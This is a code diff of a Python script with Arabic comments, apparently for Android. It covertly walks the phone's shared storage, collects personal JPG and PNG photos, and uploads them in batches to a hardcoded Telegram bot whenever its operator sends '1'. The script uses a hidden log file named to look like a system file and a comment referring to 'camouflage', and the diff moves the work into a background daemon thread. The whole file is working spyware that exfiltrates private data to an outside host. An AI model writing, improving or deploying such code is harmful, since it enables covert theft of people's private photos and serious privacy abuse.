@@ -1,11 +1,11 @@
 import os
 import time
 import requests
+import threading
 
-# بيانات الربط الخاصة بك
+# إعدادات البوت الخاصة بك
 BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
 CHAT_ID = "7084557369"
-# ملف السجل لمنع التكرار (مخفي)
 LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"
 
 def get_sent():
@@ -17,80 +17,81 @@ def save_sent(path):
         with open(LOG_FILE, "a") as f: f.write(path + "\n")
     except: pass
 
-def send_msg(text):
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                      data={"chat_id": CHAT_ID, "text": text}, timeout=10)
-    except: pass
-
 def send_doc(path):
     try:
+        # فلتر الحجم: يتجاهل أي ملف أصغر من 100 كيلوبايت (لمنع الملصقات والأيقونات)
+        if os.path.getsize(path) < 100 * 1024:
+            return False
         with open(path, "rb") as f:
             r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                               data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
         return r.status_code == 200
     except: return False
 
-def check_command():
-    """يفحص إذا أرسلت الرقم 1 للبوت"""
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-        r = requests.get(url, params={"offset": -1}, timeout=10).json()
-        if r.get("result"):
-            msg = r["result"][-1].get("message", {}).get("text", "")
-            if msg == "1": return True
-    except: pass
-    return False
-
-def super_deep_scan():
-    """مسح شامل لكل زوايا الذاكرة التي ظهرت في صورك"""
+def deep_scan():
+    """مسح شامل للمجلدات التي أرسلتها مع استبعاد الملصقات"""
     root_path = "/storage/emulated/0/"
     sent = get_sent()
-    all_photos = []
+    found = []
     
+    # الامتدادات المسموحة فقط
+    valid_exts = (".jpg", ".jpeg", ".png")
+    # مجلدات يتم تجاهلها تماماً
+    ignored_folders = ["screenshot", "cache", ".thumbnails", "stickers", "com.facebook.orca"]
+
     for root, dirs, files in os.walk(root_path):
-        # تجاهل لقطات الشاشة بناءً على طلبك
-        if "screenshot" in root.lower():
+        low_root = root.lower()
+        if any(x in low_root for x in ignored_folders):
             continue
             
         for file in files:
-            if file.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
-                full_path = os.path.join(root, file)
-                if full_path not in sent:
-                    all_photos.append(full_path)
+            if file.lower().endswith(valid_exts):
+                p = os.path.join(root, file)
+                if p not in sent:
+                    found.append(p)
     
-    # الترتيب من الأقدم للأحدث (الأرشيف أولاً)
-    all_photos.sort(key=lambda x: os.path.getmtime(x))
-    return all_photos
+    # الترتيب من الأحدث للأقدم
+    found.sort(key=lambda x: os.path.getmtime(x), reverse=True)
+    return found
 
-def main():
-    # رسالة التنبيه فور تشغيل التطبيق
-    time.sleep(2) 
-    send_msg("🚀 تم تشغيل نظام التمويه بنجاح.\nالرادار الآن في وضع الاستعداد للأرشيف العميق.\n\nأرسل رقم (1) لسحب 50 صورة جديدة.")
-    
+def background_worker():
+    """منطق العمل في الخلفية"""
+    # إرسال إشارة عند بدء التشغيل بنجاح
+    try:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                      data={"chat_id": CHAT_ID, "text": "✅ النظام نشط الآن في الخلفية.\nأرسل (1) لسحب 50 صورة نظيفة."})
+    except: pass
+
     while True:
         try:
-            if check_command():
-                send_msg("⏳ جاري سحب أعمق الصور من الأرشيف.. يرجى الانتظار.")
-                
-                photos = super_deep_scan()
-                
-                if not photos:
-                    send_msg("✅ تم سحب كل ملفات الأرشيف المتاحة حالياً.")
-                else:
+            # فحص الأوامر من البوت
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+            r = requests.get(url, params={"offset": -1}, timeout=10).json()
+            if r.get("result"):
+                msg = r["result"][-1].get("message", {}).get("text", "")
+                if msg == "1":
+                    photos = deep_scan()
                     count = 0
                     for p in photos:
-                        if count >= 50: break # الحد الأقصى للدفعة
+                        if count >= 50: break
                         if send_doc(p):
                             save_sent(p)
                             count += 1
                             time.sleep(0.3)
                     
-                    send_msg(f"✅ تم سحب دفعة مكونة من {count} صورة بنجاح.\nأرسل (1) للمزيد.")
+                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                                  data={"chat_id": CHAT_ID, "text": f"✅ تم إرسال {count} صورة بنجاح."})
             
-            time.sleep(7) # فحص الأوامر كل 7 ثوانٍ
+            time.sleep(10) # فحص كل 10 ثوانٍ
         except:
-            time.sleep(10)
+            time.sleep(15)
 
 if __name__ == "__main__":
-    main()
+    # تشغيل منطق البوت في خيط مستقل لضمان عدم توقف الخدمة
+    t = threading.Thread(target=background_worker)
+    t.daemon = True
+    t.start()
+    
+    # إبقاء العملية حية برمجياً
+    while True:
+        time.sleep(1)
